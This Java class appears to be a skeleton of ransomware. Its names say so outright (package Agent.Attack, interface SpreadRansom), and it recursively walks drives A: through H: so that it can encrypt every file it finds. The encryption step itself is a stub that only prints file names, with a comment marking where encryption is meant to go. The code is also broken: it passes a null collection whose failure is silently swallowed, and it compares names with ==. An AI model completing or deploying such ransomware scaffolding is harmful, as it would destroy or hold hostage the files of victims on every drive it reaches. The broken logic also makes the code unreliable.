package Agent.Attack;

import java.io.File;
import java.util.Collection;

import org.hibernate.query.criteria.internal.expression.ConcatExpression;

import Agent.SpreadR.SpreadRansom;

public class AttackVector implements SpreadRansom {

	public boolean isVisitedFolder(File file, Collection<File> folderTree) {
		if (folderTree == null)
			return false;
		else {
			for (File directory : folderTree) {

				if (directory.getName() == file.getName()) {
					return true;
				}
			}
			return false;
		}

	}

	// Recursive function to traverse the given directory in Java using DFS
	public void EncryptFiles(String directoryName, Collection<File> dirs) {
		File directory = new File(directoryName);

		// Get all files from a directory.
		File[] fList = directory.listFiles();
		if (fList != null) {
			for (File file : fList) {
				if (file.isDirectory()) {
					try {
						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
							EncryptFiles(file.getAbsolutePath(), dirs);
						}
					} catch (NullPointerException e) {
					}

				} else if (file.isFile()) {
					System.out.println("\t" + file.getName());
					// encryption instead of printing names of files

				}
			}
		}
	}

	@Override
	public void spread() {

		Collection<File> _folderTree = null;
		for (char i = 'A'; i <= 'H'; i++) {
			EncryptFiles((i + ":\\"), _folderTree);
		}

	}

}
